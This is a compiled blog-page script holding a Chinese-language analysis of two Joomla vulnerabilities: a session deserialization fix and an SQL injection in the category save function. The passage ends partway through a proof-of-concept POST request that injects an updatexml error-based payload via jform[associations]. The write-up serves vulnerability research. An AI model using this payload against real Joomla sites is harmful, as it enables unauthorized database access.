import{ac as o,H as e,I as c,F as n,U as s,O as p,ad as t,X as l}from"./framework-eb50ca18.js";const u={},r=n("h2",{id:"反序列化漏洞修复分析",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#反序列化漏洞修复分析","aria-hidden":"true"},"#"),s(" 反序列化漏洞修复分析")],-1),i={href:"https://github.com/joomla/joomla-cms/commit/995db72ff4eaa544e38b4da3630b7a1ac0146264#diff-aba80b5850bf0435954b29dece250cbfL1021",target:"_blank",rel:"noopener noreferrer"},k=t(`<p>上次的对象注入，需要满足三个条件：</p><ol><li>自己实现session的处理方式，重新实现了 session 存储的read()和write()方法，但是并没有对 session 的值进行安全处理。</li><li>Mysql非strict mode下，使用utf8mb4字符 <code>\\xF0\\x9D\\x8C\\x86</code> 来截断。</li><li>PHP &lt;= 5.6.13 session中反序列化解析的BUG。</li></ol><p>Joomla 官方也只能解决第一个，也就是改进session的处理方式。这次更新，在 libraries/cms/version/version.php 中，将SESSION存储在内部的Registry类对象中，弃用了以前使用 $_SESSION[$namespace][$name] 的方式：</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\\</span>Joomla<span class="token punctuation">\\</span>Registry<span class="token punctuation">\\</span>Registry</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>并且，在写SESSION的时候会先做base64_encode：</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_state</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">&#39;active&#39;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token comment">// @TODO :: generated error here</span>
		<span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token variable">$session</span> <span class="token operator">=</span> <span class="token class-name static-context">JFactory</span><span class="token operator">::</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$data</span>    <span class="token operator">=</span> <span class="token variable">$session</span><span class="token operator">-&gt;</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Before storing it, let&#39;s serialize and encode the JRegistry object</span>
	<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;joomla&#39;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">session_write_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这样，$_SESSION 就只剩下了$_SESSION[‘joomla’]，而且$_SESSION[‘joomla’] 只存储了Registry的对象$data，在执行read()和write()时候，SESSION是经过base64_encode后的数据，就不会存在read()之后自动反序列化而导致对象注入了。</p><p>在反序列化的时候也不存在unserialize参数可控的情况。（可控的只是$data的成员变量）</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;joomla&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;joomla&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;joomla&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Joomla官方这次的解决方案比较好，不像上次那样治标不治本，这样的态度值得称赞。反观Apache对struts2 漏洞的修复…就不说了。</p><h2 id="sql注入漏洞分析" tabindex="-1"><a class="header-anchor" href="#sql注入漏洞分析" aria-hidden="true">#</a> SQL注入漏洞分析</h2><h3 id="漏洞分析" tabindex="-1"><a class="header-anchor" href="#漏洞分析" aria-hidden="true">#</a> 漏洞分析</h3><p>代码位于，administrator/components/com_categories/models/category.php，save()函数内：</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token variable">$assoc</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getAssoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$assoc</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token comment">// Adding self to the association</span>
	<span class="token variable">$associations</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;associations&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$associations</span> <span class="token keyword">as</span> <span class="token variable">$tag</span> <span class="token operator">=&gt;</span> <span class="token variable">$id</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$associations</span><span class="token punctuation">[</span><span class="token variable">$tag</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Detecting all item menus</span>
	<span class="token variable">$all_language</span> <span class="token operator">=</span> <span class="token variable">$table</span><span class="token operator">-&gt;</span><span class="token property">language</span> <span class="token operator">==</span> <span class="token string single-quoted-string">&#39;*&#39;</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$all_language</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$associations</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token class-name static-context">JError</span><span class="token operator">::</span><span class="token function">raiseNotice</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">,</span> <span class="token class-name static-context">JText</span><span class="token operator">::</span><span class="token function">_</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;COM_CATEGORIES_ERROR_ALL_LANGUAGE_ASSOCIATED&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token variable">$associations</span><span class="token punctuation">[</span><span class="token variable">$table</span><span class="token operator">-&gt;</span><span class="token property">language</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$table</span><span class="token operator">-&gt;</span><span class="token property">id</span><span class="token punctuation">;</span>

	<span class="token comment">// Deleting old association for these items</span>
	<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getDbo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">getQuery</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span>
		<span class="token operator">-&gt;</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;#__associations&#39;</span><span class="token punctuation">)</span>
		<span class="token operator">-&gt;</span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">quoteName</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;context&#39;</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39; = &#39;</span> <span class="token operator">.</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">quote</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">associationsContext</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token operator">-&gt;</span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">quoteName</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;id&#39;</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39; IN (&#39;</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;,&#39;</span><span class="token punctuation">,</span> <span class="token variable">$associations</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;)&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">setQuery</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$error</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">getErrorMsg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">setError</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$all_language</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$associations</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token comment">// Adding new association for these items</span>
		<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$associations</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$query</span><span class="token operator">-&gt;</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
			<span class="token operator">-&gt;</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;#__associations&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$associations</span> <span class="token keyword">as</span> <span class="token variable">$id</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token variable">$query</span><span class="token operator">-&gt;</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;,&#39;</span> <span class="token operator">.</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">quote</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">associationsContext</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;,&#39;</span> <span class="token operator">.</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">quote</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">setQuery</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$error</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">getErrorMsg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">setError</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其中的 $associations 未经过适当处理、我们跟着流程来看看。</p><p>首先，<code>$assoc = $this-&gt;getAssoc();</code> 为 True 的时候整个逻辑才能进来，这个<code>getAssoc()</code>是什么呢？跟进getAssoc()的实现(文件的 1234 行)，发现关键是在：</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token variable">$assoc</span> <span class="token operator">=</span> <span class="token class-name static-context">JLanguageAssociations</span><span class="token operator">::</span><span class="token function">isEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,17),d={href:"http://www.slideshare.net/erictiggeler/creating-a-multilingual-site-in-joomla-joomla-3-beginners-guide-eric-tiggeler",target:"_blank",rel:"noopener noreferrer"},m=t(`<p>然后，继续看代码，<code>$associations = $data[&#39;associations&#39;];</code>, $data是post过来的数据，$associations没有经过过滤就传到了：</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">getQuery</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span>
				<span class="token operator">-&gt;</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;#__associations&#39;</span><span class="token punctuation">)</span>
				<span class="token operator">-&gt;</span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">quoteName</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;context&#39;</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39; = &#39;</span> <span class="token operator">.</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">quote</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">associationsContext</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
				<span class="token operator">-&gt;</span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">quoteName</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;id&#39;</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39; IN (&#39;</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;,&#39;</span><span class="token punctuation">,</span> <span class="token variable">$associations</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;)&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>导致SQL注入。</p><p>那 Joomla 有没有全局过滤呢？我们看看 Joomla 是如何处理POST数据的。</p><p>在 libraries/legacy/controller/form.php , save() 函数，</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">save</span><span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token variable">$urlVar</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token operator">...</span>
    <span class="token variable">$data</span>  <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">input</span><span class="token operator">-&gt;</span><span class="token property">post</span><span class="token operator">-&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;jform&#39;</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;array&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">...</span>
    <span class="token variable">$validData</span> <span class="token operator">=</span> <span class="token variable">$model</span><span class="token operator">-&gt;</span><span class="token function">validate</span><span class="token punctuation">(</span><span class="token variable">$form</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>validate() 函数在 libraries/legacy/model/form.php 302行, 他又调用了libraries/joomla/form/form.php 的filter() 函数，具体实现就不继续了，总之这里的POST参数只是处理了 ‘ XSS and specified bad code. ‘。</p><p>最后，构造POC。在修改分类，保存的时候，修改POST数据:</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token constant">POST</span> <span class="token operator">/</span>Joomla<span class="token operator">/</span>administrator<span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token operator">?</span>option<span class="token operator">=</span>com_categories<span class="token operator">&amp;</span>extension<span class="token operator">=</span>com_content<span class="token operator">&amp;</span>layout<span class="token operator">=</span>edit<span class="token operator">&amp;</span>id<span class="token operator">=</span><span class="token number">19</span>

jform<span class="token punctuation">[</span>title<span class="token punctuation">]</span><span class="token operator">=</span>Joomla<span class="token operator">!</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>alias<span class="token punctuation">]</span><span class="token operator">=</span>joomla<span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>description<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>parent_id<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">14</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>published<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>access<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>language<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">*</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>note<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>version_note<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>created_time<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2011</span><span class="token operator">-</span><span class="token number">01</span><span class="token operator">-</span><span class="token number">01</span><span class="token operator">+</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">01</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>created_user_id<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">945</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>modified_time<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2015</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">23</span><span class="token operator">+</span><span class="token number">08</span><span class="token punctuation">:</span><span class="token number">09</span><span class="token punctuation">:</span><span class="token number">46</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>modified_user_id<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">945</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>hits<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">19</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>metadesc<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>metakey<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>metadata<span class="token punctuation">]</span><span class="token punctuation">[</span>author<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>metadata<span class="token punctuation">]</span><span class="token punctuation">[</span>robots<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>associations<span class="token punctuation">]</span><span class="token punctuation">[</span>en<span class="token operator">-</span><span class="token constant">GB</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">version</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">--</span> <span class="token operator">-</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>create<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>delete<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token operator">.</span>state<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token operator">.</span>own<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>create<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>delete<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token operator">.</span>state<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token operator">.</span>own<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>create<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>delete<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token operator">.</span>state<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token operator">.</span>own<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>create<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>delete<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token 